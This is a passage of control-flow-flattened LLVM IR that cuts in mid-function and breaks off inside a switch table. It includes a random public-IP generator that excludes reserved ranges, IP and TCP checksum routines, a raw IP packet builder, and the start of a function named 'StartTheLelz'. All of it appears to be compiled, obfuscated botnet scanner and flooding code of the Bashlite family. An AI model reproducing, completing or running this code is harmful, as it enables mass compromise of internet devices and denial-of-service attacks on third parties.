  %69 = call i32 (i8*, i8*, ...) @szprintf(i8* %60, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.47, i32 0, i32 0), i32 %62, i32 %64, i32 %66, i32 %68)
  %70 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %71 = call i32 @inet_addr(i8* %70) #2
  store i32 %71, i32* %1, align 4
  store i32 849343447, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  %73 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %74 = add i8 %73, 1
  store i8 %74, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  store i32 1581907085, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %76 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %77 = zext i8 %76 to i32
  %78 = icmp eq i32 %77, 0
  %79 = select i1 %78, i32 596402706, i32 646895312
  store i32 %79, i32* %switchVar
  store i1 true, i1* %.reg2mem4
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  %81 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %82 = zext i8 %81 to i32
  %83 = icmp eq i32 %82, 10
  %84 = select i1 %83, i32 596402706, i32 -1614993122
  store i32 %84, i32* %switchVar
  store i1 true, i1* %.reg2mem4
  br label %loopEnd

; <label>:85:                                     ; preds = %loopEntry
  %86 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %87 = zext i8 %86 to i32
  %88 = icmp eq i32 %87, 100
  %89 = select i1 %88, i32 -1081800974, i32 1899702105
  store i32 %89, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  %91 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %92 = zext i8 %91 to i32
  %93 = icmp sge i32 %92, 64
  %94 = select i1 %93, i32 79631351, i32 1899702105
  store i32 %94, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  %96 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %97 = zext i8 %96 to i32
  %98 = icmp sle i32 %97, 127
  %99 = select i1 %98, i32 596402706, i32 1899702105
  store i32 %99, i32* %switchVar
  store i1 true, i1* %.reg2mem4
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  %101 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %102 = zext i8 %101 to i32
  %103 = icmp eq i32 %102, 127
  %104 = select i1 %103, i32 596402706, i32 1203423548
  store i32 %104, i32* %switchVar
  store i1 true, i1* %.reg2mem4
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %106 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %107 = zext i8 %106 to i32
  %108 = icmp eq i32 %107, 169
  %109 = select i1 %108, i32 -1688884236, i32 1305361358
  store i32 %109, i32* %switchVar
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  %111 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %112 = zext i8 %111 to i32
  %113 = icmp eq i32 %112, 254
  %114 = select i1 %113, i32 596402706, i32 1305361358
  store i32 %114, i32* %switchVar
  store i1 true, i1* %.reg2mem4
  br label %loopEnd

; <label>:115:                                    ; preds = %loopEntry
  %116 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %117 = zext i8 %116 to i32
  %118 = icmp eq i32 %117, 172
  %119 = select i1 %118, i32 -266389307, i32 1170149495
  store i32 %119, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %122 = zext i8 %121 to i32
  %123 = icmp sle i32 %122, 16
  %124 = select i1 %123, i32 1495143898, i32 1170149495
  store i32 %124, i32* %switchVar
  br label %loopEnd

; <label>:125:                                    ; preds = %loopEntry
  %126 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %127 = zext i8 %126 to i32
  %128 = icmp sle i32 %127, 31
  %129 = select i1 %128, i32 596402706, i32 1170149495
  store i32 %129, i32* %switchVar
  store i1 true, i1* %.reg2mem4
  br label %loopEnd

; <label>:130:                                    ; preds = %loopEntry
  %131 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %132 = zext i8 %131 to i32
  %133 = icmp eq i32 %132, 192
  %134 = select i1 %133, i32 -1445303903, i32 -1882707960
  store i32 %134, i32* %switchVar
  br label %loopEnd

; <label>:135:                                    ; preds = %loopEntry
  %136 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %137 = zext i8 %136 to i32
  %138 = icmp eq i32 %137, 0
  %139 = select i1 %138, i32 -928330343, i32 -1882707960
  store i32 %139, i32* %switchVar
  br label %loopEnd

; <label>:140:                                    ; preds = %loopEntry
  %141 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %142 = zext i8 %141 to i32
  %143 = icmp eq i32 %142, 2
  %144 = select i1 %143, i32 596402706, i32 -1882707960
  store i32 %144, i32* %switchVar
  store i1 true, i1* %.reg2mem4
  br label %loopEnd

; <label>:145:                                    ; preds = %loopEntry
  %146 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %147 = zext i8 %146 to i32
  %148 = icmp eq i32 %147, 192
  %149 = select i1 %148, i32 -1721446460, i32 -1486036743
  store i32 %149, i32* %switchVar
  br label %loopEnd

; <label>:150:                                    ; preds = %loopEntry
  %151 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %152 = zext i8 %151 to i32
  %153 = icmp eq i32 %152, 88
  %154 = select i1 %153, i32 1754073162, i32 -1486036743
  store i32 %154, i32* %switchVar
  br label %loopEnd

; <label>:155:                                    ; preds = %loopEntry
  %156 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %157 = zext i8 %156 to i32
  %158 = icmp eq i32 %157, 99
  %159 = select i1 %158, i32 596402706, i32 -1486036743
  store i32 %159, i32* %switchVar
  store i1 true, i1* %.reg2mem4
  br label %loopEnd

; <label>:160:                                    ; preds = %loopEntry
  %161 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %162 = zext i8 %161 to i32
  %163 = icmp eq i32 %162, 192
  %164 = select i1 %163, i32 -594821545, i32 -22954804
  store i32 %164, i32* %switchVar
  br label %loopEnd

; <label>:165:                                    ; preds = %loopEntry
  %166 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %167 = zext i8 %166 to i32
  %168 = icmp eq i32 %167, 168
  %169 = select i1 %168, i32 596402706, i32 -22954804
  store i32 %169, i32* %switchVar
  store i1 true, i1* %.reg2mem4
  br label %loopEnd

; <label>:170:                                    ; preds = %loopEntry
  %171 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %172 = zext i8 %171 to i32
  %173 = icmp eq i32 %172, 198
  %174 = select i1 %173, i32 1878383839, i32 1173599422
  store i32 %174, i32* %switchVar
  br label %loopEnd

; <label>:175:                                    ; preds = %loopEntry
  %176 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %177 = zext i8 %176 to i32
  %178 = icmp eq i32 %177, 18
  %179 = select i1 %178, i32 596402706, i32 -124806350
  store i32 %179, i32* %switchVar
  store i1 true, i1* %.reg2mem4
  br label %loopEnd

; <label>:180:                                    ; preds = %loopEntry
  %181 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %182 = zext i8 %181 to i32
  %183 = icmp eq i32 %182, 19
  %184 = select i1 %183, i32 596402706, i32 1173599422
  store i32 %184, i32* %switchVar
  store i1 true, i1* %.reg2mem4
  br label %loopEnd

; <label>:185:                                    ; preds = %loopEntry
  %186 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %187 = zext i8 %186 to i32
  %188 = icmp eq i32 %187, 198
  %189 = select i1 %188, i32 -1272911974, i32 -1356239581
  store i32 %189, i32* %switchVar
  br label %loopEnd

; <label>:190:                                    ; preds = %loopEntry
  %191 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %192 = zext i8 %191 to i32
  %193 = icmp eq i32 %192, 51
  %194 = select i1 %193, i32 -2017911883, i32 -1356239581
  store i32 %194, i32* %switchVar
  br label %loopEnd

; <label>:195:                                    ; preds = %loopEntry
  %196 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %197 = zext i8 %196 to i32
  %198 = icmp eq i32 %197, 100
  %199 = select i1 %198, i32 596402706, i32 -1356239581
  store i32 %199, i32* %switchVar
  store i1 true, i1* %.reg2mem4
  br label %loopEnd

; <label>:200:                                    ; preds = %loopEntry
  %201 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %202 = zext i8 %201 to i32
  %203 = icmp eq i32 %202, 203
  %204 = select i1 %203, i32 -901666666, i32 2066791573
  store i32 %204, i32* %switchVar
  br label %loopEnd

; <label>:205:                                    ; preds = %loopEntry
  %206 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %207 = zext i8 %206 to i32
  %208 = icmp eq i32 %207, 0
  %209 = select i1 %208, i32 -415630367, i32 2066791573
  store i32 %209, i32* %switchVar
  br label %loopEnd

; <label>:210:                                    ; preds = %loopEntry
  %211 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %212 = zext i8 %211 to i32
  %213 = icmp eq i32 %212, 113
  %214 = select i1 %213, i32 596402706, i32 2066791573
  store i32 %214, i32* %switchVar
  store i1 true, i1* %.reg2mem4
  br label %loopEnd

; <label>:215:                                    ; preds = %loopEntry
  %216 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %217 = zext i8 %216 to i32
  %218 = icmp sge i32 %217, 224
  %219 = select i1 %218, i32 596402706, i32 -1030644261
  store i32 %219, i32* %switchVar
  store i1 true, i1* %.reg2mem4
  br label %loopEnd

; <label>:220:                                    ; preds = %loopEntry
  %221 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %222 = zext i8 %221 to i32
  %223 = icmp eq i32 %222, 185
  %224 = select i1 %223, i32 -627769396, i32 -1026459111
  store i32 %224, i32* %switchVar
  br label %loopEnd

; <label>:225:                                    ; preds = %loopEntry
  %226 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %227 = zext i8 %226 to i32
  %228 = icmp eq i32 %227, 62
  %229 = select i1 %228, i32 596402706, i32 -1026459111
  store i32 %229, i32* %switchVar
  store i1 true, i1* %.reg2mem4
  br label %loopEnd

; <label>:230:                                    ; preds = %loopEntry
  %231 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %232 = zext i8 %231 to i32
  %233 = icmp eq i32 %232, 208
  %234 = select i1 %233, i32 776138563, i32 -1180283845
  store i32 %234, i32* %switchVar
  store i1 false, i1* %.reg2mem2
  br label %loopEnd

; <label>:235:                                    ; preds = %loopEntry
  %236 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %237 = zext i8 %236 to i32
  %238 = icmp eq i32 %237, 67
  store i32 -1180283845, i32* %switchVar
  store i1 %238, i1* %.reg2mem2
  br label %loopEnd

; <label>:239:                                    ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  store i32 596402706, i32* %switchVar
  store i1 %.reload3, i1* %.reg2mem4
  br label %loopEnd

; <label>:240:                                    ; preds = %loopEntry
  %.reload5 = load i1, i1* %.reg2mem4
  %241 = select i1 %.reload5, i32 108523526, i32 -2138130344
  store i32 %241, i32* %switchVar
  br label %loopEnd

; <label>:242:                                    ; preds = %loopEntry
  %243 = call i32 @rand() #2
  %244 = srem i32 %243, 255
  %245 = trunc i32 %244 to i8
  store i8 %245, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %246 = call i32 @rand() #2
  %247 = srem i32 %246, 255
  %248 = trunc i32 %247 to i8
  store i8 %248, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %249 = call i32 @rand() #2
  %250 = srem i32 %249, 255
  %251 = trunc i32 %250 to i8
  store i8 %251, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %252 = call i32 @rand() #2
  %253 = srem i32 %252, 255
  %254 = trunc i32 %253 to i8
  store i8 %254, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  store i32 1581907085, i32* %switchVar
  br label %loopEnd

; <label>:255:                                    ; preds = %loopEntry
  %256 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %257 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %258 = zext i8 %257 to i32
  %259 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %260 = zext i8 %259 to i32
  %261 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %262 = zext i8 %261 to i32
  %263 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %264 = zext i8 %263 to i32
  %265 = call i32 (i8*, i8*, ...) @szprintf(i8* %256, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.47, i32 0, i32 0), i32 %258, i32 %260, i32 %262, i32 %264)
  %266 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %267 = call i32 @inet_addr(i8* %266) #2
  store i32 %267, i32* %1, align 4
  store i32 849343447, i32* %switchVar
  br label %loopEnd

; <label>:268:                                    ; preds = %loopEntry
  %269 = load i32, i32* %1, align 4
  ret i32 %269

loopEnd:                                          ; preds = %255, %242, %240, %239, %235, %230, %225, %220, %215, %210, %205, %200, %195, %190, %185, %180, %175, %170, %165, %160, %155, %150, %145, %140, %135, %130, %125, %120, %115, %110, %105, %100, %95, %90, %85, %80, %75, %72, %47, %42, %27, %22, %7, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @rand() #4

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #13
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #8

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  %switchVar = alloca i32
  store i32 -566410527, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -566410527, label %6
    i32 1983956518, label %10
    i32 -1620866239, label %19
    i32 -805344062, label %23
    i32 158282165, label %30
    i32 -1592622325, label %31
    i32 1647238011, label %36
    i32 -1575482250, label %42
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  %9 = select i1 %8, i32 1983956518, i32 -1620866239
  store i32 %9, i32* %switchVar
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i16*, i16** %3, align 8
  %12 = getelementptr inbounds i16, i16* %11, i32 1
  store i16* %12, i16** %3, align 8
  %13 = load i16, i16* %11, align 2
  %14 = zext i16 %13 to i64
  %15 = load i64, i64* %5, align 8
  %16 = add i64 %15, %14
  store i64 %16, i64* %5, align 8
  %17 = load i32, i32* %4, align 4
  %18 = sub nsw i32 %17, 2
  store i32 %18, i32* %4, align 4
  store i32 -566410527, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %4, align 4
  %21 = icmp sgt i32 %20, 0
  %22 = select i1 %21, i32 -805344062, i32 158282165
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i16*, i16** %3, align 8
  %25 = bitcast i16* %24 to i8*
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i64
  %28 = load i64, i64* %5, align 8
  %29 = add i64 %28, %27
  store i64 %29, i64* %5, align 8
  store i32 158282165, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  store i32 -1592622325, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i64, i64* %5, align 8
  %33 = lshr i64 %32, 16
  %34 = icmp ne i64 %33, 0
  %35 = select i1 %34, i32 1647238011, i32 -1575482250
  store i32 %35, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i64, i64* %5, align 8
  %38 = and i64 %37, 65535
  %39 = load i64, i64* %5, align 8
  %40 = lshr i64 %39, 16
  %41 = add i64 %38, %40
  store i64 %41, i64* %5, align 8
  store i32 -1592622325, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i64, i64* %5, align 8
  %44 = xor i64 %43, -1
  %45 = trunc i64 %44 to i16
  ret i16 %45

loopEnd:                                          ; preds = %36, %31, %30, %23, %19, %10, %6, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #13
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #2
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #2
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  store i32 %4, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 890435641, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 890435641, label %first
    i32 1809511913, label %7
    i32 -1826574977, label %8
    i32 1396943487, label %11
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %5 = icmp sgt i32 3, %.reload
  %6 = select i1 %5, i32 1809511913, i32 -1826574977
  store i32 %6, i32* %switchVar
  br label %loopEnd

; <label>:7:                                      ; preds = %loopEntry
  store i32 1, i32* %2, align 4
  store i32 1396943487, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* %3, align 4
  %10 = call i32 @close(i32 %9)
  store i32 0, i32* %2, align 4
  store i32 1396943487, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %2, align 4
  ret i32 %12

loopEnd:                                          ; preds = %8, %7, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @StartTheLelz() #0 {
  %.reg2mem187 = alloca i32
  %.reg2mem18 = alloca %struct.telstate_t*
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct.__sigset_t, align 8
  %5 = alloca %struct.timeval, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i8*, align 8
  %10 = alloca %struct.timeval, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = call i32 @getdtablesize() #2
  %15 = sdiv i32 %14, 4
  %16 = mul nsw i32 %15, 3
  store i32 %16, i32* %1, align 4
  %17 = load i32, i32* %1, align 4
  store i32 %17, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 829005396, i32* %switchVar
  %.reg2mem198 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar17 = load i32, i32* %switchVar
  switch i32 %switchVar17, label %switchDefault [
    i32 829005396, label %first
    i32 -1807421543, label %20
    i32 1855028908, label %21
    i32 220879936, label %23
    i32 -535778866, label %37
    i32 32326147, label %42
    i32 859522911, label %57
    i32 -1843151572, label %60
    i32 1241689673, label %63
    i32 1085415777, label %64
    i32 -792476572, label %65
    i32 1187074125, label %70
    i32 -1344646409, label %NodeBlock15
    i32 -704743800, label %NodeBlock13
    i32 -1336567611, label %NodeBlock11
    i32 -1136098647, label %NodeBlock9
    i32 38212982, label %LeafBlock7
    i32 546622512, label %NodeBlock5
    i32 -2137063087, label %NodeBlock3
    i32 -1260903542, label %NodeBlock1
    i32 -676331795, label %NodeBlock
    i32 -608059298, label %LeafBlock
    i32 -1202403022, label %87
    i32 1830475780, label %100
    i32 -590988738, label %120
    i32 872450545, label %135
    i32 391096973, label %146
    i32 426529582, label %155
    i32 647453051, label %160
    i32 -394520892, label %161
    i32 -1829343253, label %200
    i32 1704989317, label %201
    i32 1125754754, label %224
    i32 867074381, label %229
    i32 433030083, label %240
    i32 -969346834, label %249
    i32 462377262, label %250
    i32 -928021133, label %258
    i32 253145803, label %264
    i32 1693787546, label %265
    i32 478676447, label %274
    i32 -1383048380, label %275
    i32 -1906514726, label %307
    i32 -587372681, label %318
    i32 1767587359, label %333
    i32 -885995345, label %364
    i32 -2058469914, label %365
    i32 -2022673136, label %369
    i32 1545987721, label %384
    i32 -1841942273, label %385
    i32 -1475217192, label %395
    i32 -1483244655, label %410
    i32 1676583517, label %411
    i32 -570672146, label %419
    i32 -1766943652, label %425
    i32 1426108293, label %434
    i32 -738313287, label %439
    i32 1240803789, label %459
    i32 -1305244304, label %477
    i32 1698613368, label %497
    i32 2135704956, label %515
    i32 -352066622, label %535
    i32 684485744, label %553
